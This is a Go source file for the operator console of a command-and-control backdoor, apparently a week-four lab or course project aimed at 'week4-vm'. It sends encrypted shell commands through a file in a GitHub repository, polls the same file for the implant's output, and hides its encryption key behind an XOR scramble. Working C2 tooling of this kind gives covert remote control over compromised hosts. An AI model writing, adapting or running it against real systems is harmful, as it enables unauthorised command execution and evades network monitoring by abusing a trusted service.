package main

import (
	"bufio"
	"c2project/pkg/encryption"
	"c2project/pkg/github"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
)

var scrambledKey = []byte{0x99, 0x15, 0xf5, 0x28, 0x9d, 0x15, 0xa7, 0x24, 0x9f, 0x12, 0xfb, 0x25, 0xca, 0x43, 0xf2, 0x23, 0xce, 0x47, 0xf5, 0x23, 0x9c, 0x40, 0xf4, 0x26, 0xc9, 0x40, 0xf5, 0x26, 0x9c, 0x47, 0xf4, 0x72, 0xca, 0x15, 0xa2, 0x29, 0x99, 0x17, 0xf5, 0x25, 0x9d, 0x16, 0xf4, 0x22, 0x9b, 0x43, 0xa1, 0x75, 0x99, 0x14, 0xfb, 0x22, 0xcc, 0x14, 0xa0, 0x29, 0xce, 0x11, 0xfb, 0x27, 0x9b, 0x11, 0xf7, 0x72}
var xorKey = []byte{0xAF, 0x22, 0xC3, 0x11}

const (
	// Standard ANSI Colors
	Reset  = "\033[0m"
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Blue   = "\033[34m"
	Purple = "\033[35m"
	Cyan   = "\033[36m"
	Gray   = "\033[37m"

	// Bold variants
	BoldGreen = "\033[1;32m"
	BoldCyan  = "\033[1;36m"
)

func main() {
	key := string(encryption.XORTransform(scrambledKey, xorKey))
	reader := bufio.NewReader(os.Stdin)

	fmt.Printf("%s--- Super Evil Chud Hacker Console ---%s\n", BoldCyan, Reset)
	fmt.Printf("%sTarget:%s week4-vm | %sProtocol:%s GitHub Backdoor\n", Gray, Green, Gray, Green)

	for {
		fmt.Printf("%s┌──(%shacker@week4%s)-[%s~%s]\n", Cyan, Red, Cyan, Gray, Cyan)
		fmt.Printf("└─%s$ %s", Cyan, Reset)
		input, _ := reader.ReadString('\n')
		command := strings.TrimSpace(input)

		if command == "" {
			continue
		}
		if command == "exit" || command == "quit" {
			break
		}

		// prep the payload
		timestamp := time.Now().Unix()
		payload := fmt.Sprintf("%d|%s", timestamp, command)

		// encrypt the payload
		encryptedPayload, err := encryption.EncryptString(payload, key)
		if err != nil {
			fmt.Println("[-] Error encrypting command:", err)
			continue
		}

		oldContent, err := github.ReadFile("commands.txt")
		if err != nil {
			fmt.Printf("[-] Error reading old file content: %v\n", err)
			continue
		}

		err = github.WriteFile("commands.txt", oldContent, encryptedPayload)
		if err != nil {
			fmt.Printf("[-] Error sending command: %v\n", err)
			continue
		}

		fmt.Printf("%s[*]%s Command Sent. Waiting for Agent Check-in...\n", Yellow, Reset)
		waitForResult(encryptedPayload, timestamp, key)
	}
}

func waitForResult(oldEncryptedPayload string, sentTimestamp int64, key string) {
	for {
		time.Sleep(5 * time.Second)

		content, err := github.ReadFile("commands.txt")
		if err != nil {
			fmt.Printf("[-] Error reading file content: %v\n", err)
			continue
		}

		if content == oldEncryptedPayload {
			// no update yet
			continue
		}

		// decrypt the content
		decrypted, err := encryption.DecryptString(content, key)
		if err != nil {
			fmt.Printf("[-] Error decrypting content: %v\n", err)
			continue
		}

		// unencode the response format (timestamp|output)
		parts := strings.SplitN(decrypted, "|", 2)
		if len(parts) != 2 {
			fmt.Println("[-] Invalid response format")
			continue
		}

		receivedTimestamp, _ := strconv.ParseInt(parts[0], 10, 64)

		if receivedTimestamp == sentTimestamp {
			fmt.Println(parts[1])
			return
		}
	}
}
